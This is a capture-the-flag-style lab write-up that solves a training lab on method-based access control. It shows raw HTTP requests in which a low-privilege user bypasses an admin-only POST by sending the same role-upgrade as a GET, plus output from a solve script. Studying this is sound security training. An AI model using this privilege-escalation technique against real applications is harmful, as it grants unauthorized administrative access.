# Lab: Method-based access control can be circumvented

### Instructions

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator. 

### Solution

Logging in as the admin we can see there is a feature in the admin panel to upgrade or downgrade users.

We can test his functionality by upgrading user carlos:

```
POST /admin-roles HTTP/2
Host: 0a6d00dd03c5d091800171a40034006e.web-security-academy.net
Cookie: session=DLu43jA5q0i6GecGc8Q9ubctYIm65VOA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a6d00dd03c5d091800171a40034006e.web-security-academy.net
Referer: https://0a6d00dd03c5d091800171a40034006e.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&action=upgrade
```

Now that we see how this works we can log out as the admin and log back in as wiener.

We know that the role change uses a POST request, but trying simply:

```
https://0a6d00dd03c5d091800171a40034006e.web-security-academy.net/admin-roles
```

in the browser we get the error `"Missing parameter 'username'"`.

We may be able to bypass the restriction here and instead of making a POST simply make a GET request, which will allow us to upgrade the wiener user:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a6d00dd03c5d091800171a40034006e.web-security-academy.net
Cookie: session=8v5bA4Z2YWVPqu2Niqbj9lWxNZ87irfB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

This works:

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

And the lab is solved. 

### Python Solution

See `access_control_11.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_11_method-based_access_control_can_be_circumvented]
└─$ python access_control_11.py https://0adc00ca041f489182f475d20028003f.web-security-academy.net/
[+] Logged in as wiener
[+] Successfully upgraded user wiener
```